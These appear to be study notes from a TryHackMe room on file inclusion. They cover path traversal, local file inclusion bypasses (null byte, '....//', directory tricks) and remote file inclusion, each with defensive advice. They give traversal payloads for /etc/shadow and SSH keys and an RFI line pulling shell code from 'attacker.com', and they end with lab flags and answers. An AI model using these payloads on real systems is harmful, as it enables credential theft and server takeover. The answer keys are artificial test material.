# **File Inclusion Vulnerabilities**

## **Overview**

File Inclusion vulnerabilities occur when a web application allows users to control files that are loaded or executed by the server. These vulnerabilities are commonly found in poorly developed web applications where user input is not properly validated or sanitized.

Applications often use URL parameters to load files such as:

* Images  
* PDF documents  
* Templates  
* Configuration files  
* Dynamic web pages

For example:

http://webapp.thm/get.php?file=userCV.pdf

In this example:

* file is the parameter  
* userCV.pdf is the requested file

If the application fails to validate the user’s input, attackers may manipulate the parameter to access unauthorized files on the server.

File inclusion vulnerabilities are dangerous because they can expose sensitive information and may even lead to Remote Command Execution (RCE).

## **Key Takeaways**

* File inclusion vulnerabilities happen because of poor input validation.  
* Attackers can manipulate file parameters to access sensitive files.  
* Common types include:  
  * Local File Inclusion (LFI)  
  * Remote File Inclusion (RFI)  
  * Directory Traversal  
* These vulnerabilities can expose:  
  * Credentials  
  * Source code  
  * Configuration files  
  * Operating system files  
* In severe cases, attackers may gain remote code execution.

## **Understanding URL Parameters**

Web applications commonly use parameters in URLs to process user input.

Example:

https://www.google.com/search?q=TryHackMe

In this URL:

* q is the parameter  
* TryHackMe is the user input

Similarly, file-based applications may use parameters to determine which file should be displayed.

## **Why File Inclusion Vulnerabilities Happen**

The primary cause is improper validation of user-controlled input.

### **Vulnerable Example**

include($\_GET\['file'\]);

In this example:

* The application directly includes whatever value the user supplies.  
* No sanitization or filtering is performed.  
* Attackers can manipulate the file parameter.

### **Common Developer Mistakes**

* Trusting user input  
* Lack of sanitization  
* Improper access control  
* Allowing unrestricted file paths

## **Types of File Inclusion Vulnerabilities**

### **Local File Inclusion (LFI)**

LFI allows attackers to include files stored locally on the server.

Example payload:

?page=../../../../etc/passwd

Possible impact:

* Reading sensitive operating system files  
* Accessing application configuration files  
* Leaking credentials

---

### **Remote File Inclusion (RFI)**

RFI occurs when the application allows remote URLs to be included.

Example payload:

?page=http://attacker.com/shell.txt

Possible impact:

* Remote code execution  
* Full server compromise  
* Malware deployment

---

### **Directory Traversal**

Directory traversal allows attackers to navigate outside intended directories using special characters such as ../

Example:

../../../etc/passwd

This technique is often used together with LFI vulnerabilities.

## **Risk and Impact**

File inclusion vulnerabilities can lead to:

* Information disclosure  
* Credential theft  
* Source code leakage  
* Session hijacking  
* Server compromise  
* Remote command execution (RCE)

### **High-Risk Files Often Targeted**

Linux:

/etc/passwd  
/etc/shadow

Windows:

C:\\Windows\\System32\\drivers\\etc\\hosts

Application files:

config.php  
.env  
database.yml

## **Additional Information**

### **Common Attack Techniques**

Attackers may combine file inclusion vulnerabilities with:

* File upload vulnerabilities  
* Log poisoning  
* PHP wrappers  
* Session file manipulation

### **Defensive Measures**

Developers should:

* Validate and sanitize all user input  
* Use allowlists for file names  
* Disable remote file inclusion  
* Restrict file permissions  
* Avoid directly using user input in include functions  
* Implement proper access controls

## **Important Facts**

* PHP applications are commonly affected due to unsafe include() and require() usage.  
* LFI vulnerabilities may become RCE vulnerabilities if attackers can upload malicious files.  
* Directory traversal is one of the most common web application weaknesses.

# **Path Traversal Vulnerabilities**

## **Overview**

Path Traversal, also known as Directory Traversal, is a web security vulnerability that allows attackers to access files and directories stored outside the intended web application directory.

This vulnerability occurs when user-controlled input is improperly validated and passed into file-handling functions. Attackers exploit this weakness by manipulating file paths using traversal sequences such as:

../

The ../ sequence instructs the operating system to move one directory upward. By repeatedly using this technique, attackers may navigate through the file system and access sensitive operating system or application files.

Path traversal vulnerabilities are commonly found in web applications written in languages such as PHP.

## **Key Takeaways**

* Path Traversal allows attackers to access unauthorized files on the server.  
* The vulnerability is caused mainly by poor input validation.  
* Attackers use traversal sequences like ../ to move through directories.  
* Sensitive operating system files may become exposed.  
* Successful exploitation can leak credentials, logs, configuration files, and SSH keys.

## **How Path Traversal Works**

A web application may allow users to request files through a URL parameter.

### **Example Normal Request**

http://webapp.thm/get.php?file=userCV.pdf

The application may retrieve the file from:

/var/www/app/CVs/userCV.pdf  
---

### **Malicious Request**

http://webapp.thm/get.php?file=../../../../etc/passwd

The attacker uses:

* ../ to move up directories  
* Repeated traversal to reach the system root /  
* Access to sensitive files outside the application directory

If no filtering exists, the server may return the contents of:

/etc/passwd

## **Common Vulnerable PHP Function**

A commonly abused PHP function is:

file\_get\_contents()

This function reads file contents directly from paths supplied by the application.

### **Important Note**

The function itself is not insecure.  
 The vulnerability occurs when developers allow unsanitized user input to control the file path.

## **Linux Path Traversal Targets**

### **Important Linux Files**

| File | Description |
| ----- | ----- |
| /etc/passwd | Registered system users |
| /etc/shadow | Password hash information |
| /etc/issue | System identification |
| /proc/version | Linux kernel version |
| /root/.bash\_history | Root user command history |
| /root/.ssh/id\_rsa | Private SSH keys |
| /var/log/apache2/access.log | Apache access logs |
| /var/mail/root | Root user's emails |

### **Example Payload**

../../../../etc/passwd

## **Windows Path Traversal Targets**

Windows systems use different paths.

### **Important Windows Files**

| File | Description |
| ----- | ----- |
| C:\\boot.ini | Boot configuration |
| C:\\Windows\\win.ini | Windows initialization file |

### **Example Payloads**

../../../../boot.ini  
../../../../windows/win.ini

## **Risk and Impact**

Successful Path Traversal attacks may lead to:

* Information disclosure  
* Credential exposure  
* Source code leakage  
* Access to configuration files  
* Server reconnaissance  
* Privilege escalation opportunities

If combined with file upload vulnerabilities, attackers may eventually achieve:

* Remote Command Execution (RCE)

## **Additional Information**

### **Common Traversal Sequences**

../  
..\\

### **Why Filters Fail**

Developers sometimes attempt weak protections such as:

* Blocking ../  
* Blacklisting filenames  
* Filtering keywords

Attackers can often bypass these protections using:

* URL encoding  
* Double encoding  
* Alternate path formats

## **Defensive Measures**

Developers should:

* Validate and sanitize all file paths  
* Restrict file access to specific directories  
* Use allowlists instead of blocklists  
* Avoid direct user control over file operations  
* Implement proper access permissions

## **Questions and Answers**

What function causes path traversal vulnerabilities in PHP?  
 **file\_get\_contents**

# **Local File Inclusion (LFI)**

## **Overview**

Local File Inclusion (LFI) is a web vulnerability that allows attackers to include and read files stored locally on the target server. LFI vulnerabilities commonly occur when user-controlled input is passed directly into PHP file-handling functions without proper validation or sanitization.

Common vulnerable PHP functions include:

include()  
require()  
include\_once()  
require\_once()

These functions are designed to load files into a PHP application. If developers allow user input to control which files are loaded, attackers may exploit the application to access sensitive operating system files or application data.

LFI vulnerabilities closely relate to Path Traversal attacks because attackers often use traversal sequences such as ../ to navigate through directories.

## **Key Takeaways**

* LFI vulnerabilities occur because of insecure file inclusion.  
* Attackers can access sensitive local files on the server.  
* PHP include functions are commonly abused.  
* Path traversal techniques are often combined with LFI.  
* LFI may eventually lead to Remote Code Execution (RCE).

## **Vulnerable PHP Functions**

### **Common PHP Include Functions**

include()  
require()  
include\_once()  
require\_once()

### **Why They Become Vulnerable**

These functions become dangerous when:

* User input directly controls file paths  
* No validation or filtering exists  
* Developers trust client-side input

## **Lab \#1 – Basic LFI**

### **Vulnerable Code**

\<?PHP  
	include($\_GET\["lang"\]);  
?\>

The application loads a file specified by the lang parameter.

### **Normal Usage**

http://webapp.thm/index.php?lang=EN.php  
http://webapp.thm/index.php?lang=AR.php

### **Exploitation**

An attacker can replace the file parameter with a sensitive system file:

http://webapp.thm/get.php?file=/etc/passwd

If no validation exists, the application includes and displays the contents of /etc/passwd.

## **Lab \#2 – Directory-Based Inclusion**

### **Vulnerable Code**

\<?PHP  
	include("languages/". $\_GET\['lang'\]);  
?\>

The developer attempts to restrict access by forcing files to load from the languages/ directory.

### **Vulnerability**

Attackers can bypass this restriction using directory traversal payloads.

### **Exploit Example**

http://webapp.thm/index.php?lang=../../../../etc/passwd

### **How It Works**

The traversal sequence:

* Moves up directories using ../  
* Escapes the languages/ folder  
* Accesses sensitive system files

## **Common Linux Files Targeted**

| File | Purpose |
| ----- | ----- |
| /etc/passwd | User account information |
| /etc/shadow | Password hashes |
| /proc/version | Linux kernel version |
| /root/.bash\_history | Root command history |
| /var/log/apache2/access.log | Apache logs |

## **Risk and Impact**

LFI vulnerabilities may lead to:

* Sensitive file disclosure  
* Credential leakage  
* Source code exposure  
* Session hijacking  
* Server reconnaissance  
* Remote Code Execution (RCE)

### **Advanced Exploitation**

Attackers may combine LFI with:

* File upload vulnerabilities  
* Log poisoning  
* PHP wrappers  
* Session file inclusion

## **Additional Information**

### **Why /etc/passwd is Important**

The /etc/passwd file:

* Lists system users  
* Reveals usernames  
* Helps attackers enumerate accounts

Example contents:

root:x:0:0:root:/root:/bin/bash

### **Important Note**

Modern Linux systems usually store password hashes in:

/etc/shadow

## **Defensive Measures**

Developers should:

* Validate and sanitize user input  
* Use allowlists for filenames  
* Avoid direct user-controlled includes  
* Restrict file permissions  
* Disable dangerous PHP configurations  
* Implement proper access controls

## **Questions and Answers**

Give Lab \#1 a try to read /etc/passwd. What would the request URI be?  
 **/lab1.php?file=/etc/passwd**

In Lab \#2, what is the directory specified in the include function?  
 **languages/**

# **Advanced Local File Inclusion (LFI) Bypass Techniques**

## **Overview**

In advanced Local File Inclusion (LFI) scenarios, developers often attempt to secure applications by adding filters, forcing file extensions, or restricting directories. However, weak filtering mechanisms can often be bypassed using various techniques such as:

* Null Byte Injection  
* Directory Traversal  
* Filter Bypass Payloads  
* Path Manipulation  
* Double Traversal Tricks

This section demonstrates how attackers analyze error messages, identify filtering behavior, and craft payloads to bypass protections and access sensitive system files such as /etc/passwd and /etc/os-release.

## **Key Takeaways**

* Error messages can reveal sensitive internal application details.  
* Developers often rely on weak blacklist filtering.  
* Null Byte Injection can bypass forced file extensions in older PHP versions.  
* Traversal filters may be bypassed using modified traversal patterns.  
* Input validation should use allowlists instead of string replacement.

## **Lab \#3 – Null Byte Injection**

### **Scenario**

The application endpoint is:

http://webapp.thm/index.php?lang=EN

Supplying invalid input reveals an error:

Warning: include(languages/THM.php): failed to open stream

### **Information Disclosed**

The error reveals:

* The application uses:

include(languages/THM.php);

* The application appends .php  
* The full application path:

/var/www/html/THM-4/

### **Problem**

Even after traversal:

../../../../etc/passwd

the application still appends:

.php

Resulting payload:

../../../../etc/passwd.php

which does not exist.

### **Null Byte Injection**

Attackers bypass this using:

%00

### **Exploit Example**

../../../../etc/passwd%00

This causes the application to terminate the string before .php.

### **Important Note**

The %00 Null Byte technique:

* Worked on older PHP versions  
* Was patched in PHP 5.3.4+

## **Lab \#4 – Filter Bypass Using Current Directory Trick**

### **Scenario**

The application filters requests targeting:

/etc/passwd

### **Bypass Techniques**

#### **Method 1 – Null Byte**

/etc/passwd%00

#### **Method 2 – Current Directory Trick**

/etc/passwd/.

### **Why It Works**

* . refers to the current directory  
* The path still resolves to:

/etc/passwd

## **Lab \#5 – Traversal Filter Bypass**

### **Scenario**

The application removes traversal sequences:

../

### **Error Message**

include(languages/etc/passwd)

This confirms:

* The filter replaces only the first matching traversal sequence  
* Filtering is incomplete

### **Bypass Payload**

....//....//....//....//etc/passwd

### **Why It Works**

The filter removes:

../

but leaves behind:

../

after processing.

This allows traversal to still occur.

## **Lab \#6 – Forced Directory Inclusion**

### **Scenario**

The application requires input to contain a specific directory:

languages/EN.php

### **Exploit Technique**

Attackers include the required directory and then traverse upward:

languages/../../../../../etc/passwd

### **Important Concept**

The required directory:

* Satisfies validation checks  
* Traversal sequences escape the directory afterward

## **Common LFI Bypass Techniques**

| Technique | Purpose |
| ----- | ----- |
| ../ | Directory traversal |
| %00 | Null Byte Injection |
| ....// | Traversal filter bypass |
| /. | Current directory trick |
| Double encoding | Filter evasion |

## **Risk and Impact**

Advanced LFI vulnerabilities may lead to:

* Sensitive file disclosure  
* Credential leakage  
* Source code exposure  
* Log poisoning  
* Session hijacking  
* Remote Code Execution (RCE)

## **Additional Information**

### **Important Files Often Targeted**

| File | Purpose |
| ----- | ----- |
| /etc/passwd | User enumeration |
| /etc/shadow | Password hashes |
| /etc/os-release | Operating system version |
| /root/.ssh/id\_rsa | SSH private keys |
| Apache logs | Log poisoning attacks |

### **Why Error Messages Are Dangerous**

Verbose errors reveal:

* Internal file paths  
* Programming logic  
* Framework behavior  
* Filter implementations

## **Defensive Measures**

Developers should:

* Disable verbose error messages  
* Use allowlists for filenames  
* Prevent directory traversal  
* Avoid direct file inclusion from user input  
* Normalize paths before validation  
* Implement strict access controls

## **Questions and Answers**

Give Lab \#3 a try to read /etc/passwd. What does the request look like?  
 **/lab3.php?file=../../../../etc/passwd**

Which function is causing the directory traversal in Lab \#4?  
 **file\_get\_contents**

Try out Lab \#6 and check what is the directory that has to be in the input field?  
 **THM-profile**

Try out Lab \#6 and read /etc/os-release. What is the VERSION\_ID value?  
 **12**

# **Local File Inclusion (LFI) Challenges and Remote File Inclusion (RFI)**

## **Overview**

This challenge focuses on applying Local File Inclusion (LFI) and Remote File Inclusion (RFI) techniques to capture flags and eventually achieve Remote Command Execution (RCE).

The objective is to:

* Identify vulnerable input points  
* Analyze how the application processes user input  
* Bypass input validation mechanisms  
* Read sensitive files  
* Exploit Remote File Inclusion to execute commands on the server

The exercise demonstrates how insecure file handling can escalate from simple file disclosure to full server compromise.

## **Key Takeaways**

* LFI vulnerabilities can exist in:  
  * GET parameters  
  * POST requests  
  * Cookies  
  * HTTP headers  
* Error messages often reveal critical application information.  
* Input filtering is frequently weak and bypassable.  
* RFI vulnerabilities may allow attackers to execute remote code.  
* File inclusion vulnerabilities can escalate into full Remote Command Execution (RCE).

## **Steps for Testing LFI Vulnerabilities**

### **1\. Identify Entry Points**

Potential vulnerable inputs include:

* URL parameters  
* Form fields  
* Cookies  
* Headers

Example:

?page=home.php  
---

### **2\. Test Valid and Invalid Inputs**

Attackers observe:

* Error messages  
* File path disclosures  
* Server responses

---

### **3\. Use Traversal Payloads**

Example:

../../../../etc/passwd  
---

### **4\. Analyze Filters**

Test bypass techniques such as:

* Null Bytes %00  
* Double traversal  
* Encoded traversal  
* Directory tricks

---

### **5\. Read Sensitive Files**

Target common files such as:

* /etc/passwd  
* /etc/shadow  
* /etc/os-release  
* SSH keys  
* Application configs

## **Remote File Inclusion (RFI)**

### **What is RFI?**

Remote File Inclusion occurs when an application allows external URLs to be included and executed by the server.

### **Example Vulnerable Code**

include($\_GET\['page'\]);

### **Example Exploit**

?page=http://attacker.com/shell.txt

The application fetches and executes remote malicious code.

## **Remote Command Execution (RCE)**

### **What is RCE?**

Remote Command Execution allows attackers to execute system commands on the target server.

### **Common Impact**

Attackers may:

* Execute shell commands  
* Upload malware  
* Create backdoors  
* Gain full server control

## **Important Concepts**

### **Why RFI is Dangerous**

RFI can:

* Execute attacker-controlled PHP code  
* Bypass authentication  
* Lead to complete system compromise

### **Common Requirements for RFI**

* allow\_url\_include \= On  
* allow\_url\_fopen \= On

## **Additional Information**

### **Common LFI/RFI Targets**

| File | Purpose |
| ----- | ----- |
| /etc/passwd | User enumeration |
| /etc/shadow | Password hashes |
| /etc/os-release | OS information |
| Apache logs | Log poisoning |
| SSH keys | Unauthorized access |

### **Typical Exploitation Chain**

1. Discover LFI  
2. Bypass filters  
3. Read sensitive files  
4. Upload malicious file  
5. Trigger file inclusion  
6. Achieve RCE

## **Defensive Measures**

Developers should:

* Disable remote file inclusion  
* Validate and sanitize input  
* Use allowlists for filenames  
* Restrict file permissions  
* Disable dangerous PHP configurations  
* Avoid directly including user-controlled files

## **Questions and Answers**

Capture Flag1 at /etc/flag1  
 **F1x3d-iNpu7-f0rrn**

Capture Flag2 at /etc/flag2  
 **c00k13\_i5\_yuMmy1**

Capture Flag3 at /etc/flag3  
 **P0st\_1s\_w0rk1in9**

Gain RCE in Lab \#Playground /playground.php with RFI to execute the hostname command. What is the output?  
 **lfi2rce**

